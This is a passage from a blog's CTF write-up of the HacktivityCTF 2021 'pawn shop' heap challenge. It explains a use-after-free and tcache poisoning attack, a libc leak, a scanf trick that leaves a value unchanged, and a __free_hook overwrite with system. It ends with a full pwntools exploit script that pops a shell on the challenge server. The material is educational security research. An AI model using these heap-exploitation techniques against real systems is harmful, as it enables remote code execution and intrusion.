<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tcache</span><span class="p">:</span> <span class="n">buy_item</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
<span class="n">buy_item</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>

<span class="n">print_items</span><span class="p">()</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'Name: '</span><span class="p">)</span>
<span class="n">libc_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">(</span><span class="bp">False</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">-</span> <span class="mh">0x1ebbe0</span> <span class="c1"># main_arena + 96
</span>
<span class="n">manage_item</span><span class="p">(</span><span class="n">tcache</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__free_hook</span><span class="p">))</span>
</code></pre></div></div>
<p>Weirdly, tcachebins end up being the following:</p>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Tcachebins[idx=1, size=0x30] count=7  ←  Chunk(addr=0x556d29f1f7e0, size=0x30, flags=PREV_INUSE)  ←  [Corrupted chunk at 0x7b]
Tcachebins[idx=7, size=0x90] count=7  ←  Chunk(addr=0x556d29f1f810, size=0x90, flags=PREV_INUSE)  ←  Chunk(addr=0x7f93dfbf7b28, size=0x0, flags=) &lt;--- __free_hook
</code></pre></div></div>
<p>If you notice, <code class="language-plaintext highlighter-rouge">tcachebin[0x30]</code> contains an invalid <code class="language-plaintext highlighter-rouge">next</code> pointer. This will make the programm <code class="language-plaintext highlighter-rouge">SEGFAULT</code>, because on second allocation it will return <code class="language-plaintext highlighter-rouge">0x7b</code> (123) and the program will try to write values there, but since it is an invalid pointer, the program will <code class="language-plaintext highlighter-rouge">SEGFAULT</code>. This value is the one we used for <code class="language-plaintext highlighter-rouge">new_price</code> in <code class="language-plaintext highlighter-rouge">manage_items</code> function.<br />
To prevent this from happening, you can use a valid pointer as <code class="language-plaintext highlighter-rouge">new_price</code> (libc free area, some heap area etc). But, since the program reads <code class="language-plaintext highlighter-rouge">price</code> using <code class="language-plaintext highlighter-rouge">scanf</code>, you can use a small <code class="language-plaintext highlighter-rouge">scanf</code> trick to preserve the original value.<br />
The trick is, whenever <code class="language-plaintext highlighter-rouge">scanf</code> is instructed to read a number (<code class="language-plaintext highlighter-rouge">int</code>/<code class="language-plaintext highlighter-rouge">float</code>/<code class="language-plaintext highlighter-rouge">double</code> etc) if it receives non-numeric input, it doesn’t alter the destination value, so the destination value remains same. The responsible code for this is a little complex, but the gist is <code class="language-plaintext highlighter-rouge">scanf</code> calls <code class="language-plaintext highlighter-rouge">strtod</code>/<code class="language-plaintext highlighter-rouge">strtold</code>/<code class="language-plaintext highlighter-rouge">stdtof</code> to convert the recevied input to the actual value (<code class="language-plaintext highlighter-rouge">double</code>/<code class="language-plaintext highlighter-rouge">long double</code>/<code class="language-plaintext highlighter-rouge">float</code>). When these function receive an input which doesn’t correspond to an actual value, they write the same input to output buffer and <code class="language-plaintext highlighter-rouge">scanf</code> checks if it’s <strong>not</strong> the case, only then the value is written.<br />
This means giving a simple string like <code class="language-plaintext highlighter-rouge">stdnoerr</code> will not change the destination value. But it is better to use a single character instead of a string. A small snippet where the check is performed is below:</p>
<div class="language-c highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kt">long</span> <span class="kt">double</span> <span class="n">d</span> <span class="o">=</span> <span class="n">__strtold_internal</span>
    <span class="p">(</span><span class="n">char_buffer_start</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">charbuf</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">tw</span><span class="p">,</span> <span class="n">flags</span> <span class="o">&amp;</span> <span class="n">GROUP</span><span class="p">);</span> <span class="c1">// strtold</span>
<span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="n">flags</span> <span class="o">&amp;</span> <span class="n">SUPPRESS</span><span class="p">)</span> <span class="o">&amp;&amp;</span> <span class="n">tw</span> <span class="o">!=</span> <span class="n">char_buffer_start</span> <span class="p">(</span><span class="o">&amp;</span><span class="n">charbuf</span><span class="p">))</span> <span class="c1">// the second part is </span>
   <span class="o">*</span><span class="n">ARG</span> <span class="p">(</span><span class="kt">long</span> <span class="kt">double</span> <span class="o">*</span><span class="p">)</span> <span class="o">=</span> <span class="n">d</span><span class="p">;</span>                                   <span class="c1">// the culprit</span>
</code></pre></div></div>
<p>So, the following code will resolve the problem.</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">a</span> <span class="o">=</span> <span class="n">sell_item</span><span class="p">(</span><span class="s">'stdnoerr'</span><span class="p">)</span>
<span class="n">tcache</span> <span class="o">=</span> <span class="p">[</span><span class="n">sell_item</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">)]</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tcache</span><span class="p">:</span> <span class="n">buy_item</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
<span class="n">buy_item</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>

<span class="n">print_items</span><span class="p">()</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'Name: '</span><span class="p">)</span>
<span class="n">libc_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">(</span><span class="bp">False</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">-</span> <span class="mh">0x1ebbe0</span> <span class="c1"># main_arena + 96
</span>
<span class="n">manage_item</span><span class="p">(</span><span class="n">tcache</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__free_hook</span><span class="p">),</span> <span class="n">new_price</span> <span class="o">=</span> <span class="s">'s'</span><span class="p">)</span>
</code></pre></div></div>
<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Tcachebins[idx=1, size=0x30] count=7  ←  Chunk(addr=0x5591a4d067e0, size=0x30, flags=PREV_INUSE)  ←  Chunk(addr=0x5591a4d06720, size=0x30, flags=PREV_INUSE)  ←  [...]
Tcachebins[idx=7, size=0x90] count=7  ←  Chunk(addr=0x5591a4d06810, size=0x90, flags=PREV_INUSE)  ←  Chunk(addr=0x7fa53fa4bb28, size=0x0, flags=) &lt;--- __free_hook
</code></pre></div></div>
<p>Now, we just need to make an allocation to put <code class="language-plaintext highlighter-rouge">__free_hook</code> on head and then do another allocation to overwrite <code class="language-plaintext highlighter-rouge">__free_hook</code>. I used the first allocation to store <code class="language-plaintext highlighter-rouge">/bin/sh</code> string.</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">bin_sh</span> <span class="o">=</span> <span class="n">sell_item</span><span class="p">(</span><span class="s">'/bin/sh'</span><span class="p">)</span>
<span class="n">sell_item</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span><span class="p">))</span>
</code></pre></div></div>
<p>I put <code class="language-plaintext highlighter-rouge">/bin/sh</code> in <code class="language-plaintext highlighter-rouge">name</code> because <code class="language-plaintext highlighter-rouge">name</code> member is freed first. Now, we just need to free the chunk containing <code class="language-plaintext highlighter-rouge">/bin/sh</code>. Just add the following line:</p>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">buy_item</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
</code></pre></div></div>
<p>And… you get a shell!</p>

<h1 id="final-exploit">Final exploit</h1>
<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#!/usr/bin/env python3
</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">indexes</span> <span class="o">=</span> <span class="p">[</span><span class="bp">False</span><span class="p">]</span><span class="o">*</span><span class="mi">11</span>

<span class="k">def</span> <span class="nf">start</span><span class="p">():</span>
    <span class="k">global</span> <span class="n">p</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'challenge.ctf.games'</span><span class="p">,</span> <span class="mi">31561</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">p</span> <span class="o">=</span> <span class="n">elf</span><span class="p">.</span><span class="n">process</span><span class="p">(</span><span class="n">env</span> <span class="o">=</span> <span class="p">{</span><span class="s">"LD_PRELOAD"</span><span class="p">:</span> <span class="n">libc</span><span class="p">.</span><span class="n">path</span><span class="p">})</span>

<span class="k">def</span> <span class="nf">attach_gdb</span><span class="p">():</span>
    <span class="k">if</span> <span class="n">args</span><span class="p">.</span><span class="n">REMOTE</span> <span class="ow">or</span> <span class="n">args</span><span class="p">.</span><span class="n">NOGDB</span><span class="p">:</span>
        <span class="k">return</span>
    
    <span class="n">attach</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="s">'''
    // for gdb-gef
    heap chunks
    heap bins
    continue
    '''</span><span class="p">)</span>
    <span class="nb">input</span><span class="p">(</span><span class="s">"ATTACHED?"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">b2f</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
    <span class="k">return</span> <span class="nb">str</span><span class="p">(</span><span class="n">struct</span><span class="p">.</span><span class="n">unpack</span><span class="p">(</span><span class="s">'&lt;d'</span><span class="p">,</span> <span class="n">data</span><span class="p">)[</span><span class="mi">0</span><span class="p">])</span>

<span class="k">def</span> <span class="nf">i2f</span><span class="p">(</span><span class="n">n</span><span class="p">):</span>
    <span class="k">return</span> <span class="n">b2f</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">n</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">sendchoice</span><span class="p">(</span><span class="n">choice</span><span class="p">:</span> <span class="nb">str</span><span class="p">):</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="n">choice</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">buy_item</span><span class="p">(</span><span class="n">index</span><span class="p">:</span> <span class="nb">int</span><span class="p">):</span>
    <span class="n">sendchoice</span><span class="p">(</span><span class="s">'B'</span><span class="p">)</span>

    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'buy?: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>

<span class="k">def</span> <span class="nf">manage_item</span><span class="p">(</span><span class="n">index</span><span class="p">:</span> <span class="nb">int</span><span class="p">,</span> <span class="n">new_name</span><span class="p">:</span> <span class="nb">bytes</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'stdnoerr'</span><span class="p">,</span> <span class="n">new_price</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">123</span><span class="p">,</span> <span class="n">new_len</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mh">0x80</span><span class="p">):</span>
    <span class="n">sendchoice</span><span class="p">(</span><span class="s">'M'</span><span class="p">)</span>

    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'?: '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">index</span><span class="p">))</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="n">i2f</span><span class="p">(</span><span class="n">new_price</span><span class="p">)</span> <span class="k">if</span> <span class="nb">type</span><span class="p">(</span><span class="n">new_price</span><span class="p">)</span> <span class="o">==</span> <span class="nb">int</span> <span class="k">else</span> <span class="n">new_price</span><span class="p">)</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">new_len</span><span class="p">))</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="n">new_name</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">sell_item</span><span class="p">(</span><span class="n">name</span><span class="p">:</span> <span class="nb">bytes</span><span class="p">,</span> <span class="n">price</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mi">123</span><span class="p">,</span> <span class="n">name_len</span><span class="p">:</span> <span class="nb">int</span> <span class="o">=</span> <span class="mh">0x80</span><span class="p">):</span>
    <span class="n">sendchoice</span><span class="p">(</span><span class="s">'S'</span><span class="p">)</span>

    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="n">i2f</span><span class="p">(</span><span class="n">price</span><span class="p">))</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">name_len</span><span class="p">))</span>
    <span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="n">name</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">indexes</span><span class="p">.</span><span class="n">count</span><span class="p">(</span><span class="bp">False</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="n">indexes</span><span class="p">.</span><span class="n">index</span><span class="p">(</span><span class="bp">False</span><span class="p">)</span>
        <span class="n">indexes</span><span class="p">[</span><span class="n">ret</span><span class="p">]</span> <span class="o">=</span> <span class="bp">True</span>
        <span class="k">return</span> <span class="n">ret</span> <span class="o">+</span> <span class="mi">1</span>
    
    <span class="k">else</span><span class="p">:</span>
        <span class="k">raise</span> <span class="nb">Exception</span><span class="p">(</span><span class="s">"No index available"</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">leave</span><span class="p">():</span>
    <span class="n">sendchoice</span><span class="p">(</span><span class="s">'L'</span><span class="p">)</span>

<span class="k">def</span> <span class="nf">print_items</span><span class="p">():</span>
    <span class="n">sendchoice</span><span class="p">(</span><span class="s">'P'</span><span class="p">)</span>

<span class="n">context</span><span class="p">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./pawned'</span><span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'./libc_2.31.so'</span><span class="p">)</span>
<span class="n">start</span><span class="p">()</span>

<span class="n">a</span> <span class="o">=</span> <span class="n">sell_item</span><span class="p">(</span><span class="s">'stdnoerr'</span><span class="p">)</span>
<span class="n">tcache</span> <span class="o">=</span> <span class="p">[</span><span class="n">sell_item</span><span class="p">(</span><span class="nb">str</span><span class="p">(</span><span class="n">i</span><span class="p">)</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">)]</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="n">tcache</span><span class="p">:</span> <span class="n">buy_item</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
<span class="n">buy_item</span><span class="p">(</span><span class="n">a</span><span class="p">)</span>

<span class="n">print_items</span><span class="p">()</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'Name: '</span><span class="p">)</span>
<span class="n">libc_leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">recvline</span><span class="p">(</span><span class="bp">False</span><span class="p">).</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span>
<span class="n">libc</span><span class="p">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">libc_leak</span> <span class="o">-</span> <span class="mh">0x1ebbe0</span> <span class="c1"># main_arena + 96
</span>
<span class="n">manage_item</span><span class="p">(</span><span class="n">tcache</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">],</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">__free_hook</span><span class="p">),</span> <span class="n">new_price</span> <span class="o">=</span> <span class="s">'s'</span><span class="p">)</span>

<span class="n">bin_sh</span> <span class="o">=</span> <span class="n">sell_item</span><span class="p">(</span><span class="s">'/bin/sh'</span><span class="p">)</span>
<span class="n">sell_item</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span><span class="p">))</span>

<span class="n">buy_item</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
<span class="n">p</span><span class="p">.</span><span class="n">close</span><span class="p">()</span>
</code></pre></div></div>

<p>Lastly, if you have any questions/doubts, please ping me on discord <code class="language-plaintext highlighter-rouge">stdnoerr#7880</code>. I will be happy to discuss.</p>

	  </div>

		
		<ul class="tag_box list-unstyled list-inline">
		  <li><i class="fa fa-folder-open"></i></li>
		  
		  
			 
				<li><a href="/categories.html#writeup-ref">
					writeup <span>(2)</span>
					
				</a></li>
			
		  
		</ul>
		  

		
		<ul class="list-inline">
		  <li><i class="fa fa-tags"></i></li>
		  
		  
			 
				<li>
					<a href="/tags.html#heap-ref">
					heap <span>(2)</span>
					,
					</a>
				</li>
			 
				<li>
					<a href="/tags.html#uaf-ref">
					uaf <span>(1)</span>
					
					</a>
				</li>
			
		  
		  
		</ul>
		  

		<hr>

		<div>
      <section class="share col-sm-6">
        <h4 class="section-title">Share Post</h4>
        <a class="btn btn-default btn-sm twitter" href="http://twitter.com/share?text=HacktivityCTF 2021 pawn shop challenge writeup&via=stdnoerr"
           onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
          <i class="fa fa-twitter fa-lg"></i>
          Twitter
        </a>
        <a class="btn btn-default btn-sm facebook" href="https://www.facebook.com/sharer/sharer.php"
           onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
          <i class="fa fa-facebook fa-lg"></i>
          Facebook
        </a>
        <a class="btn btn-default btn-sm gplus"
           onclick="window.open('https://plus.google.com/share?url='+window.location.href, 'google-plus-share', 'width=490,height=530');return false;">
          <i class="fa fa-google-plus fa-lg"></i>
          Google+
        </a>
      </section>

      <section class="col-sm-6 author">
        <img src="//www.gravatar.com/avatar/fe66ffe3df09aee77973014c55d36d1c" class="img-rounded author-image" />
        <h4 class="section-title author-name">stdnoerr</h4>
        <p class="author-bio">CTFer | pwner | wanna learn everything</p>
      </section>
    </div>

    <div class="clearfix"></div>

		<ul class="pager">
		  
		  <li class="previous"><a href="/ctf/2021/09/19/ACSC2021.html" title="ACSC 2021 - Pwn challenges">&larr; Previous</a></li>
		  
		  
		  <li class="next"><a href="/writeup/2022/08/21/eBPF-exploitation-(ft.-D-3CTF-d3bpf).html" title="Learning eBPF exploitation">Next &rarr;</a></li>
		  
		</ul>

		<hr>
	</div>
	
	<div class="col-sm-2 sidebar-2">
	
	</div>
</article>
<div class="clearfix"></div>





		<footer>
			<hr/>
			<p>
				&copy; 2022 stdnoerr with <a href="http://jekyllrb.com/">Jekyll</a>. Theme: <a href="https://github.com/dbtek/dbyll">dbyll</a> by dbtek.
			</p>
		</footer>
	</div>

	<script type="text/javascript" src="/assets/resources/jquery/jquery.min.js"></script>
	<script type="text/javascript" src="/assets/resources/bootstrap/js/bootstrap.min.js"></script>
	<script type="text/javascript" src="/assets/js/app.js"></script>
</body>
</html>



<!-- Asynchronous Google Analytics snippet -->
<script>
  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');

  ga('create', 'stdnoerr_blog', 'auto');
  ga('send', 'pageview');
</script>

